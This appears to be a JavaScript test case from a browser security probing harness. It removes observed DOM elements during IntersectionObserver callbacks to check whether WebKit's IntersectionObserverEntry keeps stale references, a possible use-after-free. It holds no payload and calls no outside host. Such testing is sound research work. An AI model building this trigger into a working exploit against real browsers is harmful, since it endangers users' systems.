/**
 * SC_INTERSECTION_OBSERVER_UAF.JS
 * Categoria : DOM — Use-After-Free
 * Alvo      : WebCore::IntersectionObserver / IntersectionObserverEntry C++
 * Técnica   : Registra IntersectionObserver em múltiplos elementos,
 *             remove os elementos DURANTE a entrega do callback inicial
 *             (que ocorre assincronamente após observe()). As
 *             IntersectionObserverEntry C++ geradas podem referenciar
 *             elementos já coletados. Testa também o path de
 *             unobserve() sobre elemento removido.
 * Referência: WebKit IntersectionObserver entry lifecycle UAF
 */

export default {
    id:          'INTERSECTION_OBSERVER_UAF',
    category:    'DOM',
    risk:        'HIGH',
    description: 'IntersectionObserver callback entregue sobre elementos removidos. '
                + 'Testa IntersectionObserverEntry C++ com target stale.',

    _observer:     null,
    _targets:      [],
    _container:    null,
    _entries:      [],

    // Numéricos
    _entryCount:   -1,
    _cbCallCount:  -1,

    // Strings
    _entryTarget0:  'pending',
    _entryConnected: 'pending',
    _ratioAfter:    'pending',
    _unobserveErr:  'none',

    supported: function() {
        return typeof IntersectionObserver !== 'undefined';
    },

    setup: async function() {
        this._entries      = [];
        this._targets      = [];
        this._entryCount   = 0;
        this._cbCallCount  = 0;
        this._entryTarget0  = 'pending';
        this._entryConnected = 'pending';
        this._ratioAfter    = 'pending';
        this._unobserveErr  = 'none';

        this._container = document.createElement('div');
        this._container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1';
        document.body.appendChild(this._container);

        // Cria 5 elementos observáveis
        for (let i = 0; i < 5; i++) {
            const el = document.createElement('div');
            el.style.cssText = `width:20px;height:20px;background:red;position:absolute;top:${i*30}px;left:0`;
            el.setAttribute('data-idx', String(i));
            this._container.appendChild(el);
            this._targets.push(el);
        }

        const self = this;

        this._observer = new IntersectionObserver((entries) => {
            self._cbCallCount++;
            self._entryCount += entries.length;

            for (const entry of entries) {
                self._entries.push({
                    ratio:     entry.intersectionRatio,
                    connected: String(entry.target?.isConnected ?? 'null'),
                    nodeName:  entry.target?.nodeName ?? 'null',
                    idx:       entry.target?.getAttribute('data-idx') ?? 'null',
                });
            }

            // Captura dados da primeira entrada
            if (entries[0]) {
                self._entryTarget0  = entries[0].target?.nodeName ?? 'null';
                self._entryConnected = String(entries[0].target?.isConnected ?? 'null');
                self._ratioAfter     = String(entries[0].intersectionRatio);
            }
        }, {
            root:       null,
            rootMargin: '0px',
            threshold:  [0, 0.5, 1.0],
        });

        // Observa todos os elementos
        for (const el of this._targets) {
            this._observer.observe(el);
        }

        // Aguarda o callback inicial
        await new Promise(r => setTimeout(r, 100));
        void this._container.offsetWidth;
    },

    trigger: async function() {
        // Remove todos os elementos ANTES do próximo batch de callbacks
        for (const el of this._targets) {
            el.remove();
        }
        void document.body.offsetWidth;

        // Força novos callbacks sobre elementos removidos via scroll simulado
        try {
            window.dispatchEvent(new Event('scroll'));
        } catch(_) {}

        // Tenta unobserve sobre elementos removidos
        for (const el of this._targets) {
            try {
                this._observer.unobserve(el);
            } catch(e) {
                this._unobserveErr = e.constructor.name;
                break;
            }
        }

        // Aguarda possíveis callbacks tardios sobre elementos stale
        await new Promise(r => setTimeout(r, 80));

        // Tenta takeRecords após remoção
        try {
            const pending = this._observer.takeRecords();
            this._entryCount += pending.length;
        } catch(_) {}
    },

    probe: [
        // [0-3] contadores — sempre number
        s => s._cbCallCount,
        s => s._entryCount,
        s => s._entries.length,
        s => s._targets.length,

        // [4-7] dados das entries — sempre string
        s => s._entryTarget0,
        s => s._entryConnected,
        s => s._ratioAfter,
        s => s._unobserveErr,

        // [8-10] acesso ao target stale via entries salvas
        s => s._entries[0]?.nodeName   ?? 'null',
        s => s._entries[0]?.connected  ?? 'null',
        s => s._entries.some(e => e.connected === 'false') ? 'stale-entry' : 'all-connected',

        // [11-13] elementos removidos — leitura direta
        s => String(s._targets[0]?.isConnected ?? 'null'),
        s => String(s._container.isConnected),
        s => s._container.children.length,
    ],

    cleanup: async function() {
        try { this._observer?.disconnect(); } catch(_) {}
        this._container?.remove();
        this._container = null; this._observer = null;
        this._targets = []; this._entries = [];
        this._entryCount = -1; this._cbCallCount = -1;
        this._entryTarget0 = 'pending'; this._entryConnected = 'pending';
        this._ratioAfter = 'pending'; this._unobserveErr = 'none';
    }
};
